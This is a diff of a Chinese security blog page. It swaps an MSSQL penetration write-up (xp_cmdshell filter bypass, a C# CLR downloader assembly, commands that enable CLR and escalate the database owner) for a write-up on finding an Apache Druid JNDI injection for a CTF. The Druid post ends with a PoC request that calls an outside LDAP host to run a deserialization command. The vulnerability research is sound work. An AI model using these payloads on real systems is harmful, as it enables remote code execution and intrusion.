@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>渗透技巧之特殊环境的mssql思路 · qiqing&#39;s Blog</title>
+    <title>apache druid 漏洞挖掘 · qiqing&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >qiqing&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">渗透技巧之特殊环境的mssql思路</a>
+                <a href="#" class="post-name">apache druid 漏洞挖掘</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            渗透技巧之特殊环境的mssql思路
+            apache druid 漏洞挖掘
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/03/10</span>
+                    <span class="post-intro-time">2024/01/30</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,49 +395,57 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="渗透技巧之特殊环境的mssql思路"><a href="#渗透技巧之特殊环境的mssql思路" class="headerlink" title="渗透技巧之特殊环境的mssql思路"></a>渗透技巧之特殊环境的mssql思路</h1><h5 id="图片来源真实环境，目前取得都是历史保留"><a href="#图片来源真实环境，目前取得都是历史保留" class="headerlink" title="图片来源真实环境，目前取得都是历史保留"></a>图片来源真实环境，目前取得都是历史保留</h5><p>某次实战项目中，在一个.NET的站点发现了一个dbo权限的注入，但是这次遇到的数据库和windows版本都很高，本次记录下渗透过程中遇到的问题和解决方法<img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219094347949.png" alt="image-20200219094347949"></p>
-<p>有了注入点，接下来就是查询三连，查询用户权限，查询版本信息，查询当前数据库</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219095042968.png" alt="image-20200219095042968"></p>
-<p>dbo权限，开启xp_cmdshell发现有过滤，过滤了空格和%0a，这里用存储过程来绕过这个过滤</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219095932280.png" alt="image-20200219095932280"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219100409650.png" alt="image-20200219100409650"></p>
-<p>开启之后，检查一下，先创建一个表，将xp_cmdshell的执行结果插入表中，然后用报错注入查询数据</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219103432987.png" alt="image-20200219103432987"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219103534721.png" alt="image-20200219103534721"></p>
-<p>目标能成功执行命令，执行ping命令，看是否能出网，这里需要注意下，执行命令的时候可以用提取环境变量的字符替换空格</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143206079.png" alt="image-20200219143206079"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143315287.png" alt="image-20200219143315287"></p>
-<p>目标执行下载命令无结果，后续尝试了<strong>certutil</strong>，<strong>bitsadmin</strong>，都报错了，写入vbs后，vbs拒绝访问，命令行下载失败，转回mssql，使用mssql的功能帮助我们下载文件</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143628981.png" alt="image-20200219143628981"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143640607.png" alt="image-20200219143640607"></p>
-<p>解决这个问题可以使用CLR执行</p>
-<p>Common Language Runtime(CLR)程序集定义为可以导入SQL Server的.NET DLL（或DLL组）。导入后，DLL方法可以链接到存储过程并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本机功能的好方法，但自然也为攻击者创造了机会。</p>
-<p>首先，需要先生成下载文件的dll，代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace Hi.Test</span><br><span class="line">&#123;</span><br><span class="line">    public class SQLClr</span><br><span class="line">    &#123;</span><br><span class="line">        public static string Run(string url, string path)</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                HttpWebRequest request &#x3D; WebRequest.Create(url) as HttpWebRequest;</span><br><span class="line">                &#x2F;&#x2F;发送请求并获取相应回应数据</span><br><span class="line">                HttpWebResponse response &#x3D; request.GetResponse() as HttpWebResponse;</span><br><span class="line">                &#x2F;&#x2F;直到request.GetResponse()程序才开始向目标网页发送Post请求</span><br><span class="line">                Stream responseStream &#x3D; response.GetResponseStream();</span><br><span class="line">                &#x2F;&#x2F;创建本地文件写入流</span><br><span class="line">                Stream stream &#x3D; new FileStream(path, FileMode.Create);</span><br><span class="line">                byte[] bArr &#x3D; new byte[1024];</span><br><span class="line">                int size &#x3D; responseStream.Read(bArr, 0, (int)bArr.Length);</span><br><span class="line">                while (size &gt; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                    stream.Write(bArr, 0, size);</span><br><span class="line">                    size &#x3D; responseStream.Read(bArr, 0, (int)bArr.Length);</span><br><span class="line">                &#125;</span><br><span class="line">                stream.Close();</span><br><span class="line">                responseStream.Close();</span><br><span class="line">                return &quot;OK&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                return ex.ToString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunProc(string proc, string arg)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlDataRecord record &#x3D; new SqlDataRecord(new SqlMetaData(&quot;ret&quot;, SqlDbType.NVarChar, 4000));</span><br><span class="line">            SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line">            record.SetString(0, Run(proc, arg));</span><br><span class="line">            SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line">            SqlContext.Pipe.SendResultsEnd();</span><br><span class="line">        &#125;</span><br><span class="line">        public static string ProcessArch()</span><br><span class="line">        &#123;</span><br><span class="line">            return Marshal.SizeOf(typeof(IntPtr)) &#x3D;&#x3D; 8 ? &quot;x64&quot; : &quot;x86&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>某日,华为大佬突然说apache druid有0day,并且发送了一个github的链接<a href="https://github.com/chaitin/Real-World-CTF-5th-Challenges/tree/main/Druid' target=" _blank" rel="noopener" s%20selection">长亭出的一道CTF题目</a>,下载github的项目,打开发现,是一个docker,里面只有一个druid,所以,该CTF真的就是挖出druid的0day,google搜索了下Apache Druid的docs,文档介绍说Apache Druid 是一个实时分析数据库，专为对大型数据集进行快速切片和切块分析, 大多数情况下，Druid 支持实时摄取、快速查询性能和高正常运行时间很重要的用例.数据库这个关键字,当时我就猜想,是JDBC的JNDI注入,其实,这个注入早就被发现了,我没关注过,不知道druid修复了.后面,大佬提醒我是kafka的JNDI,有了方向,就开始尝试挖掘</p>
+<h3 id="尝试挖掘"><a href="#尝试挖掘" class="headerlink" title="尝试挖掘"></a>尝试挖掘</h3><p>光速下载了Apache Druid的源码,搜索了一下lookup,没有!心里凉了半截,源码没有,那就只能从Resource开始阅读源码,一边debug一边看,启动ctf的docker,先黑盒看看ctf的druid有啥功能没,结果ctf的druid没几个功能正常,这个按下不表,为了调试方便,我又装了一个本机的druid,同时还装了一个kafka做测试的数据源,启动本机的druid,黑盒看了它的功能,因为没接触过大数据相关的知识,我只能浅显的理解为druid可以从一些数据源中获取数据,然后整合保存成一份tables,后续从tables中查询数据,在我的理解中,能发起JNDI请求的操作,明显是获取数据的时候,因为后续都是druid自身实现的功能,如果是查询阶段发起的JNDI注入,那在源码里应该能搜索到,并且,在文档中,也没搜不到能发起JNDI的功能,那按照挖掘的顺序,肯定优先挖掘获取数据的时候.</p>
+<p>druid的Server端是guice+jersey,不是普通的ssm架构,通过黑盒的抓包信息,发现URL为/druid/indexer/v1/sampler?for=connect,搜索该URL对应的Resource</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230129165349-d2t7wlf.png" alt="image-20230129165349-d2t7wlf"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230129165528-726jeo4.png" alt="image.png"></p>
+<p>在SamplerResource打下断点,查看数据流到Resource前有无经过高危操作,看不出来,从功能来讲,能有高危操作,就在拦截器和过滤器中,跟进filter,同样未发现有高危操作</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230129171900-5nm2als.png" alt="image.png"></p>
+<p>只能跟进sample方法,简单浏览和debug走了一下,简单概括就是初始化kafkaConsumer,通过KafkaRecordSupplier操作kafkaConsumer和kafka Server链接,后续将数据打包处理之后返回给前端,通过不停的来回debug,大致了解到代码运行到这里时,数据已经返回了,后续的代码是处理数据的阶段,有大段的算法,暂时放弃,并且,该阶段主要由自身的代码实现,如果有JNDI,在之前的代码搜索中就能发现,主要精力放到初始化kafkaConsumer开始审计,一直到发起链接为止,开始的思路是链接kafka和从kafka读取数据的时候,是否会出问题?先从输入源开始追踪,之后来来回回的debug过程中,感觉非常的难熬,时不时就会跳到另一个线程中,不停的有干扰的断点出现,很多lambda 表达式和链式调用给我阅读体验非常差!</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130112444-e74wenx.png" alt="image.png"></p>
+<p>开始从初始化kafkaConsumer进行跟踪,进入kafka client之后,明显代码就好阅读很多了,从debug过程中可以发现config可以由外部控制,传入的bootstrap.servers由我们传入,第一时间关注这个servers的传参</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130143746-8kuh7j6.png" alt="image.png"></p>
+<p>跟踪servers一直往下走,进入ClientUtils.parseAndValidateAddresses方法,其实看到返回值就能明白,kafka client与server端的链接是采用socket直接链接,没有调用JNDI的地方,心里非常凉,觉得已经没希望了</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130150228-rj066tz.png" alt="image.png"></p>
+<p>这个时候,又不甘心,心里想可能追错了,回去docker的durid又看了一遍,docker的durid非常奇怪,其他的功能都是502,只有设置数据源可以访问,如果这是CTF的提示,其实也很明显了,就是设置数据源有问题,其中kafka有两个设置数据源的地方,之前我只看了第一个,后面又看到了第二个设置kafka链接的选项,并且,进入之后,发现一个非常有趣的参数sasl.jaas.config</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130151418-kygkuyq.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130151439-vcifnsa.png" alt="image.png"></p>
+<p>sasl是一种java默认提供的认证机制,肯定支持LDAP的方式进行认证,google一下相关的文档,woc,瞬间觉得看到希望了,回去跟踪kafka client的sasl认证,从docs继续搜索kafka的sasl认证,发现sasl存在多种认证,并且支持ldap,稳啦!?并没有!</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130152024-0tewp8q.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130154721-v3rjvgk.png" alt="image.png"></p>
+<p>sasl有多种认证方式,从docs中可以发现传入不同的sasl.jaas.config,他走的认证也不同,当我查看ldap的认证的时候,发现传入的参数竟然和plain一样,赶紧去看看org.apache.kafka.common.serurity.plain.PlainLoginModule,一眼看完,没有高危操作,只能跟踪一下,这个类怎么调用</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130155754-1ko240q.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130160006-439nvec.png" alt="image.png"></p>
+<p> 重新进入断点,在ClientUtils.createChannelBuilder(config, this.time, logContext);方法中获取了sasl的相关参数,跟进</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130152443-dfkavhn.png" alt="image.png"></p>
+<p>最后跟进create方法,这个方法会根据serurityProtocol选择不同的ChannelBuilder(如果显示在前端的不是SASL,那估计还要花更多时间来挖掘,也是运气哈哈),config传入3个参数,根据config的参数走SASL分支,代码也比较清晰明了,主要获取构造SaslChannelBuilder的参数,其中,最主要的是jaasContext,跟进JaasContext.loadClientContext(configs)方法</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130152700-kuvwuxy.png" alt="image.png"></p>
+<p>从docs中可以发现主要是sasl.jaas.config控制了认证登陆的逻辑,并且,传入的参数是一个类!跟进到load,此时我传入的参数是javax.naming.initialContext,成功设置到jaasConfig,说明在设置属性时,不会对传入的参数进行校验,往下跟进sasl的认证过程</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130223841-4rme3jd.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130223551-guculit.png" alt="image.png"> </p>
+<p>之后就是所以传入JaasContext的方法都跟踪一遍,后面的代码对JaasContext的调用没啥分支,可以一路跟到发起认证的调用点</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130232006-tkm4n1z.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130233953-zjngo8u.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130234054-zw1heqt.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130234140-y8nqufi.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130234202-am33hq2.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130234222-88bnepm.png" alt="image.png"></p>
+<p>一直跟进到javax.security.auth.login.LoginContext#invoke方法,中途没有检查javax.naming.initialContext的合法性,但是invoke方法里对method的invoke有明显的要求,先invoke initialize方法,之后再invoke login方法,一般这种写法都是继承某一个统一的接口</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230130234248-hhzjl57.png" alt="image.png"></p>
+<p>回到org.apache.kafka.common.serurity.plain.PlainLoginModule,他继承自LoginModule,查看LoginModule的继承者</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131102809-l1q2lyf.png" alt="image.png"></p>
+<p>bingo!发现一个JNDI,根据上面的数据流跟踪,全程是没有校验认证的Module是否合法</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131102911-1oynvm9.png" alt="image.png"></p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131103356-85uq014.png" alt="image.png"></p>
+<h5 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h5><p>根据JndiLoginModule的代码构造一个JNDI</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?for=connect HTTP/1.1</span><br><span class="line">Host: 172.16.119.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 835</span><br><span class="line">Origin: http://172.16.119.1:8888</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://172.16.119.1:8888/unified-console.html</span><br><span class="line">Cookie: _ga=GA1.1.1507312734.1665393894</span><br><span class="line"></span><br><span class="line">&#123;"type":"kafka","spec":&#123;"type":"kafka","ioConfig":&#123;"type":"kafka","consumerProperties":&#123;"security.protocol":"SASL_SSL","sasl.mechanism":"PLAIN","sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://1.117.103.234:1389/Deserialization/CommonsCollections1/Command/whoami\" group.provider.url=\"d\" storePass=\"true\";","bootstrap.servers":"localhost:9092"&#125;,"topic":"kttm","useEarliestOffset":true,"inputFormat":&#123;"type":"regex","pattern":"([\\s\\S]*)","listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965","columns":["raw"]&#125;&#125;,"dataSchema":&#123;"dataSource":"sample","timestampSpec":&#123;"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"&#125;,"dimensionsSpec":&#123;&#125;,"granularitySpec":&#123;"rollup":false&#125;&#125;,"tuningConfig":&#123;"type":"kafka"&#125;&#125;,"samplerConfig":&#123;"numRows":500,"timeoutMs":15000&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后需要将生成的dll转成hex，使用powershell脚本进行转换</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$assemblyFile &#x3D; &quot;C:\Users\Administrator\Downloads\63nmap\63\ClassLibrary1.dll&quot;&#x2F;&#x2F;生成的dll</span><br><span class="line">$stringBuilder &#x3D; New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM &#96;n0x&quot;) | Out-Null</span><br><span class="line">$fileStream &#x3D; [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte &#x3D; $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line"> $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">$stringBuilder.AppendLine(&quot;&#96;nWITH PERMISSION_SET &#x3D; UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[clr_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME </span><br><span class="line">[my_assembly].[StoredProcedures].[clr_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[clr_exec] &#39;whoami&#39;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\Administrator\Downloads\63nmap\63\exec.txt&#x2F;&#x2F;生成的16进制</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143933477.png" alt="image-20200219143933477"></p>
-<p>开启CLR，这里使用存储过程执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">-- Enable clr on the server</span><br><span class="line">sp_configure &#39;clr enabled&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219144843568.png" alt="image-20200219144843568"></p>
-<p>需要设置数据库拥有者为sa，这个方法不能使用master数据库来执行查询语句，这里使用存储过程执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter database [数据库名] set TRUSTWORTHY on</span><br><span class="line">EXEC sp_changedbowner &#39;sa&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219144907747.png" alt="image-20200219144907747"></p>
-<p>创建一个名为sysinfo的存储过程，创建执行存储过程的函数，这里创建存储过程不能使用存储过程执行，而且不能一起执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create assembly sysinfo from 0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000000000000000000000000000*****</span><br><span class="line">with permission_set&#x3D;unsafe;</span><br><span class="line">create procedure sysinfo_run_proc(@proc nvarchar(max),@arg nvarchar(max)) as external name sysinfo.[Hi.Test.SQLClr].RunProc;</span><br><span class="line">create function sysinfo_run(@proc nvarchar(max),@arg nvarchar(max)) returns nvarchar(max) as external name sysinfo.[Hi.Test.SQLClr].Run;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145231308.png" alt="image-20200219145231308"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145251817.png" alt="image-20200219145251817"></p>
-<p>使用创建好的函数执行下载程序</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145437748.png" alt="image-20200219145437748"></p>
-<p>使用xp_cmdshell查看是否下载成功</p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145920748.png" alt="image-20200219145920748"></p>
-<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145945274.png" alt="image-20200219145945274"></p>
-<p>CLR可以将免杀的程序进行不落地执行，但是，如果免杀不太懂，还是建议创建一个能稳定下载的函数，这样可以便于团队的合作，将上线的操作交给熟悉免杀的队员</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131103657-kcl5n80.png" alt="image.png"></p>
+<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>中途还挖了2个黑盒就能发现洞</p>
